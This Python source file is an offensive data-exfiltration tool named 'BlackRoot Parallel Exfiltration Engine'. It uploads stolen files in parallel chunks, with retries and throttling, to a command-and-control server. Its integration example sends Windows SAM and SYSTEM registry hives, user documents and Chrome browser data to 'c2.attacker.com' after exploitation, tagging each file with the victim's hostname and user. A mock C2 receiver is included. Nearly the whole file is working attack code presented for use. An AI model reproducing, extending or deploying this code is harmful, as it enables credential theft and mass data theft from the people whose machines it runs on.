"""
BlackRoot Parallel Exfiltration Engine
- Multi-threaded concurrent uploads (4-16 workers)
- Large file chunking (adaptive chunk sizing)
- Automatic retry with exponential backoff
- Dead-letter queue for failed transfers
- Bandwidth throttling + throughput monitoring
- Integration with C2 and BlackVault
"""

import threading
import queue
import time
import logging
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple, Optional
import requests
from pathlib import Path
import hashlib

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')


class ParallelC2ExfilHandler:
    """
    Enhanced C2 exfiltration with multi-threaded parallel uploads.
    
    Features:
    - Configurable worker threads (4-16 concurrent transfers)
    - Automatic chunking for files >chunk_size
    - Retry logic with exponential backoff
    - Dead-letter queue for failed transfers
    - Bandwidth throttling and monitoring
    - File integrity verification (SHA256)
    """
    
    def __init__(
        self,
        c2_url: str,
        max_workers: int = 8,
        chunk_size: int = 1024 * 1024,  # 1 MB default
        timeout: int = 30,
        bandwidth_limit_mbps: Optional[float] = None
    ):
        """
        Initialize parallel exfiltration handler.
        
        Args:
            c2_url: Base C2 server URL (e.g., "http://attacker.com:8000")
            max_workers: Number of concurrent upload threads (4-16)
            chunk_size: Size of file chunks in bytes (default 1 MB)
            timeout: Request timeout in seconds
            bandwidth_limit_mbps: Optional bandwidth limit in MB/s
        """
        self.c2_url = c2_url.rstrip('/')
        self.max_workers = max(4, min(16, max_workers))  # Clamp to 4-16
        self.chunk_size = chunk_size
        self.timeout = timeout
        self.bandwidth_limit_mbps = bandwidth_limit_mbps
        
        self.logger = logging.getLogger("ParallelExfil")
        self.failed_queue = queue.Queue()  # Retry queue
        self.lock = threading.Lock()
        
        self.transfer_stats = {
            "total_files": 0,
            "successful": 0,
            "failed": 0,
            "total_bytes": 0,
            "total_chunks": 0,
            "start_time": None,
            "end_time": None,
            "failed_files": []
        }
    
    def _calculate_sha256(self, file_path: str) -> str:
        """Calculate SHA256 hash of file for integrity verification."""
        sha256_hash = hashlib.sha256()
        with open(file_path, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()
    
    def _throttle_bandwidth(self, bytes_sent: int, elapsed_time: float) -> None:
        """Throttle bandwidth if limit is set."""
        if self.bandwidth_limit_mbps and elapsed_time > 0:
            current_mbps = (bytes_sent / (1024 * 1024)) / elapsed_time
            if current_mbps > self.bandwidth_limit_mbps:
                # Sleep to maintain rate limit
                sleep_time = (bytes_sent / (1024 * 1024)) / self.bandwidth_limit_mbps - elapsed_time
                if sleep_time > 0:
                    time.sleep(sleep_time)
    
    def upload_file(
        self,
        file_path: str,
        metadata: Optional[Dict] = None,
        retry_count: int = 0,
        max_retries: int = 3
    ) -> Dict:
        """
        Upload single file with automatic retry on failure.
        
        Args:
            file_path: Path to file to upload
            metadata: Optional metadata dict (filename, source, timestamp, etc.)
            retry_count: Current retry attempt number
            max_retries: Maximum retry attempts
            
        Returns:
            Dict with upload status, bytes transferred, chunk count
        """
        metadata = metadata or {}
        
        try:
            # Validate file exists
            if not os.path.exists(file_path):
                raise FileNotFoundError(f"File not found: {file_path}")
            
            file_size = os.path.getsize(file_path)
            
            # Read file data
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # Calculate checksum
            file_hash = self._calculate_sha256(file_path)
            
            # Determine upload strategy based on file size
            if file_size > self.chunk_size:
                result = self._chunked_upload(
                    file_path,
                    file_data,
                    file_hash,
                    metadata
                )
            else:
                result = self._single_upload(
                    file_path,
                    file_data,
                    file_hash,
                    metadata
                )
            
            if result.get("status") == "success":
                with self.lock:
                    self.transfer_stats["successful"] += 1
                    self.transfer_stats["total_bytes"] += file_size
                
                self.logger.info(
                    f"✓ Uploaded: {os.path.basename(file_path)} "
                    f"({file_size / 1024:.1f} KB)"
                )
                return result
            else:
                raise Exception(f"Upload returned non-success status: {result}")
        
        except Exception as e:
            self.logger.warning(
                f"✗ Upload failed (attempt {retry_count + 1}/{max_retries}): "
                f"{os.path.basename(file_path)} - {e}"
            )
            
            # Retry with exponential backoff
            if retry_count < max_retries:
                backoff_time = 2 ** retry_count  # 1s, 2s, 4s, 8s...
                self.logger.debug(f"Retrying in {backoff_time}s...")
                time.sleep(backoff_time)
                
                return self.upload_file(
                    file_path,
                    metadata,
                    retry_count=retry_count + 1,
                    max_retries=max_retries
                )
            else:
                with self.lock:
                    self.transfer_stats["failed"] += 1
                    self.transfer_stats["failed_files"].append({
                        "path": file_path,
                        "error": str(e)
                    })
                
                # Add to retry queue
                self.failed_queue.put((file_path, metadata))
                
                return {
                    "status": "failed",
                    "file": file_path,
                    "error": str(e),
                    "bytes": 0,
                    "chunks": 0
                }
    
    def _single_upload(
        self,
        file_path: str,
        data: bytes,
        file_hash: str,
        metadata: Dict
    ) -> Dict:
        """Upload file in single request."""
        try:
            response = requests.post(
                f"{self.c2_url}/exfil/upload",
                files={"file": (os.path.basename(file_path), data)},
                data={
                    "file_path": file_path,
                    "file_hash": file_hash,
                    "metadata": json.dumps(metadata),
                    "chunk_count": 1
                },
                timeout=self.timeout
            )
            
            if response.status_code in [200, 201]:
                return {
                    "status": "success",
                    "file": file_path,
                    "bytes": len(data),
                    "chunks": 1,
                    "hash": file_hash
                }
            else:
                raise Exception(f"HTTP {response.status_code}: {response.text}")
        
        except requests.exceptions.RequestException as e:
            raise Exception(f"Request failed: {e}")
    
    def _chunked_upload(
        self,
        file_path: str,
        data: bytes,
        file_hash: str,
        metadata: Dict
    ) -> Dict:
        """Upload large file in chunks."""
        try:
            file_size = len(data)
            chunks = [
                data[i:i + self.chunk_size]
                for i in range(0, len(data), self.chunk_size)
            ]
            
            self.logger.debug(
                f"Uploading {os.path.basename(file_path)} in "
                f"{len(chunks)} chunks ({file_size / 1024 / 1024:.1f} MB)"
            )
            
            # Send all chunks
            for idx, chunk in enumerate(chunks):
                response = requests.post(
                    f"{self.c2_url}/exfil/chunk",
                    files={"chunk": chunk},
                    data={
                        "file_path": file_path,
                        "file_hash": file_hash,
                        "chunk_number": idx + 1,
                        "total_chunks": len(chunks),
                        "metadata": json.dumps(metadata)
                    },
                    timeout=self.timeout
                )
                
                if response.status_code not in [200, 201]:
                    raise Exception(
                        f"Chunk {idx + 1}/{len(chunks)} failed: "
                        f"HTTP {response.status_code}"
                    )
            
            with self.lock:
                self.transfer_stats["total_chunks"] += len(chunks)
            
            return {
                "status": "success",
                "file": file_path,
                "bytes": file_size,
                "chunks": len(chunks),
                "hash": file_hash
            }
        
        except Exception as e:
            raise Exception(f"Chunked upload failed: {e}")
    
    def parallel_exfil(
        self,
        file_list: List[str],
        metadata_dict: Optional[Dict[str, Dict]] = None,
        max_retries: int = 3
    ) -> Dict:
        """
        Upload multiple files in parallel using thread pool.
        
        This is the main entry point for mass exfiltration.
        
        Args:
            file_list: List of file paths to upload
            metadata_dict: Optional dict mapping file paths to metadata
            max_retries: Max retry attempts per file (default 3)
            
        Returns:
            Dict with comprehensive transfer statistics
        """
        metadata_dict = metadata_dict or {}
        self.transfer_stats["start_time"] = time.time()
        self.transfer_stats["total_files"] = len(file_list)
        
        self.logger.info(
            f"[*] Starting parallel exfil: {len(file_list)} files "
            f"across {self.max_workers} threads"
        )
        self.logger.info(f"    Chunk size: {self.chunk_size / 1024 / 1024:.1f} MB")
        if self.bandwidth_limit_mbps:
            self.logger.info(f"    Bandwidth limit: {self.bandwidth_limit_mbps} MB/s")
        
        results = []
        start_time = time.time()
        bytes_processed = 0
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Submit all upload tasks to thread pool
            future_to_file = {
                executor.submit(
                    self.upload_file,
                    file_path,
                    metadata_dict.get(file_path),
                    max_retries=max_retries
                ): file_path
                for file_path in file_list
            }
            
            # Process results as they complete (not blocking order)
            for future in as_completed(future_to_file):
                file_path = future_to_file[future]
                try:
                    result = future.result()
                    results.append(result)
                    bytes_processed += result.get("bytes", 0)
                    
                    # Apply bandwidth throttling
                    elapsed = time.time() - start_time
                    self._throttle_bandwidth(bytes_processed, elapsed)
                
                except Exception as e:
                    self.logger.error(f"Thread exception for {file_path}: {e}")
                    results.append({
                        "status": "failed",
                        "file": file_path,
                        "error": str(e),
                        "bytes": 0
                    })
        
        # Calculate final statistics
        self.transfer_stats["end_time"] = time.time()
        elapsed = self.transfer_stats["end_time"] - self.transfer_stats["start_time"]
        throughput = self.transfer_stats["total_bytes"] / elapsed if elapsed > 0 else 0
        
        stats = {
            **self.transfer_stats,
            "duration_seconds": elapsed,
            "throughput_mbps": throughput / (1024 * 1024),
            "results": results
        }
        
        # Log summary
        self.logger.info("[+] Parallel exfil complete:")
        self.logger.info(
            f"    Files: {stats['total_files']} total, "
            f"{stats['successful']} success, {stats['failed']} failed"
        )
        self.logger.info(
            f"    Data: {stats['total_bytes'] / 1024 / 1024:.2f} MB "
            f"in {stats['total_chunks']} chunks"
        )
        self.logger.info(
            f"    Speed: {elapsed:.2f}s total, "
            f"{stats['throughput_mbps']:.2f} MB/s throughput"
        )
        
        return stats
    
    def retry_failed(self, max_retries: int = 3) -> Dict:
        """
        Retry failed transfers from dead-letter queue.
        
        Args:
            max_retries: Max attempts per file
            
        Returns:
            Dict with retry statistics (retried count, recovered count)
        """
        retry_list = []
        while not self.failed_queue.empty():
            try:
                file_path, metadata = self.failed_queue.get_nowait()
                retry_list.append((file_path, metadata))
            except queue.Empty:
                break
        
        if not retry_list:
            self.logger.info("No failed transfers to retry")
            return {"retried": 0, "recovered": 0}
        
        self.logger.info(f"[*] Retrying {len(retry_list)} failed transfers...")
        recovered = 0
        failed_again = []
        
        for file_path, metadata in retry_list:
            result = self.upload_file(
                file_path,
                metadata,
                max_retries=max_retries
            )
            
            if result["status"] == "success":
                recovered += 1
                self.logger.info(f"    ✓ Recovered: {os.path.basename(file_path)}")
            else:
                failed_again.append(file_path)
                self.logger.warning(f"    ✗ Still failing: {os.path.basename(file_path)}")
        
        self.logger.info(
            f"[+] Recovered {recovered}/{len(retry_list)} failed transfers"
        )
        
        return {
            "retried": len(retry_list),
            "recovered": recovered,
            "still_failing": failed_again
        }
    
    def get_stats(self) -> Dict:
        """Get current transfer statistics."""
        return dict(self.transfer_stats)


# ============================================================
# Integration Utilities
# ============================================================

def create_exfil_metadata(
    source: str,
    hostname: str = None,
    user: str = None,
    timestamp: float = None
) -> Dict:
    """Create standardized metadata dict for exfiltrated files."""
    import socket
    import getpass
    
    return {
        "source": source,
        "hostname": hostname or socket.gethostname(),
        "user": user or getpass.getuser(),
        "timestamp": timestamp or time.time(),
        "exfil_tool": "BlackRoot-ParallelExfil-v1"
    }


def collect_files_for_exfil(
    target_paths: List[str],
    recursive: bool = True,
    max_size_mb: Optional[int] = None
) -> Tuple[List[str], Dict[str, Dict]]:
    """
    Collect files matching patterns for exfiltration.
    
    Args:
        target_paths: List of file paths or glob patterns
        recursive: Recursively search directories
        max_size_mb: Skip files larger than this
        
    Returns:
        Tuple of (file_list, metadata_dict)
    """
    from glob import glob
    
    files = []
    metadata = {}
    max_bytes = max_size_mb * 1024 * 1024 if max_size_mb else None
    
    for pattern in target_paths:
        matched = glob(pattern, recursive=recursive)
        
        for file_path in matched:
            try:
                if os.path.isfile(file_path):
                    file_size = os.path.getsize(file_path)
                    
                    # Check size limit
                    if max_bytes and file_size > max_bytes:
                        logging.warning(f"Skipping {file_path} (too large)")
                        continue
                    
                    files.append(file_path)
                    metadata[file_path] = create_exfil_metadata(
                        source=f"file_collection:{pattern}"
                    )
            
            except Exception as e:
                logging.warning(f"Error processing {file_path}: {e}")
    
    return files, metadata


# ============================================================
# Integration with PayloadEngine
# ============================================================

def integrate_parallel_exfil_with_payload_engine():
    """
    Example: Using parallel exfil with PayloadEngine for
    credential exfiltration after successful injection.
    """
    try:
        from payload_engine import PayloadEngine
    except ImportError:
        logging.warning("PayloadEngine not available for integration demo")
        return
    
    # Initialize engine
    engine = PayloadEngine()
    
    # Create parallel exfil handler
    exfil = ParallelC2ExfilHandler(
        c2_url="http://c2.attacker.com:8000",
        max_workers=8,
        chunk_size=1024 * 1024  # 1 MB chunks
    )
    
    # Example: Exfil credentials + system info after exploitation
    files_to_exfil = [
        "C:\\Windows\\System32\\config\\SAM",        # Windows SAM hive
        "C:\\Windows\\System32\\config\\SYSTEM",     # System hive
        "C:\\Users\\*\\Documents\\*.docx",           # User documents
        "C:\\Users\\*\\AppData\\Local\\Chrome\\User Data\\Default\\*",  # Browser data
    ]
    
    # Collect files matching patterns
    file_list, metadata_dict = collect_files_for_exfil(
        files_to_exfil,
        recursive=True,
        max_size_mb=100  # Skip files >100 MB
    )
    
    logging.info(f"Collected {len(file_list)} files for exfiltration")
    
    # Exfil in parallel (8 concurrent threads)
    stats = exfil.parallel_exfil(file_list, metadata_dict)
    
    # Retry any failures
    retry_stats = exfil.retry_failed(max_retries=3)
    
    # Store statistics in vault for tracking
    try:
        engine.vault.store(
            f"exfil_stats_{int(time.time())}",
            json.dumps({
                "primary": stats,
                "retry": retry_stats
            }).encode()
        )
    except Exception as e:
        logging.warning(f"Could not store stats in vault: {e}")
    
    return stats, retry_stats


# ============================================================
# Example: Simulated C2 Server Endpoint
# ============================================================

def create_mock_c2_server():
    """
    For testing: Flask app that receives exfiltrated files.
    
    Usage:
        from parallel_exfil import create_mock_c2_server
        app = create_mock_c2_server()
        app.run(host='0.0.0.0', port=8000)
    """
    try:
        from flask import Flask, request
    except ImportError:
        logging.warning("Flask not available - mock C2 server not available")
        return None
    
    app = Flask(__name__)
    received_files = []
    
    @app.route('/exfil/upload', methods=['POST'])
    def upload_file():
        """Receive single-file upload."""
        file_obj = request.files.get('file')
        file_path = request.form.get('file_path')
        file_hash = request.form.get('file_hash')
        metadata = request.form.get('metadata')
        
        if file_obj:
            data = file_obj.read()
            received_files.append({
                'name': file_obj.filename,
                'path': file_path,
                'size': len(data),
                'hash': file_hash,
                'metadata': metadata,
                'received_at': time.time()
            })
            logging.info(f"✓ Received file: {file_obj.filename} ({len(data)} bytes)")
            return {'status': 'ok'}, 200
        
        return {'error': 'no file'}, 400
    
    @app.route('/exfil/chunk', methods=['POST'])
    def upload_chunk():
        """Receive chunked file upload."""
        chunk_obj = request.files.get('chunk')
        file_path = request.form.get('file_path')
        chunk_num = request.form.get('chunk_number')
        total_chunks = request.form.get('total_chunks')
        
        if chunk_obj:
            data = chunk_obj.read()
            logging.info(
                f"✓ Received chunk {chunk_num}/{total_chunks} "
                f"for {os.path.basename(file_path)} ({len(data)} bytes)"
            )
            return {'status': 'ok'}, 200
        
        return {'error': 'no chunk'}, 400
    
    @app.route('/stats', methods=['GET'])
    def get_stats():
        """Get statistics of received files."""
        total_size = sum(f['size'] for f in received_files)
        return {
            'total_files': len(received_files),
            'total_bytes': total_size,
            'files': received_files
        }
    
    return app


if __name__ == "__main__":
    # Example usage
    logging.basicConfig(
        level=logging.INFO,
        format='[%(asctime)s] %(levelname)s: %(message)s'
    )
    
    exfil = ParallelC2ExfilHandler(
        c2_url="http://localhost:8000",
        max_workers=8,
        chunk_size=512 * 1024  # 512 KB chunks for testing
    )
    
    # Create test files
    test_dir = "/tmp/exfil_test"
    os.makedirs(test_dir, exist_ok=True)
    
    test_files = []
    for i in range(6):
        test_file = f"{test_dir}/test_file_{i}.bin"
        with open(test_file, 'wb') as f:
            f.write(b"test data " * 10000)  # ~100 KB each
        test_files.append(test_file)
    
    logging.info(f"Created {len(test_files)} test files")
    
    # Exfil in parallel
    stats = exfil.parallel_exfil(
        test_files,
        metadata_dict={
            f: create_exfil_metadata(source="test_exfil")
            for f in test_files
        }
    )
    
    logging.info(f"Final stats: {stats}")
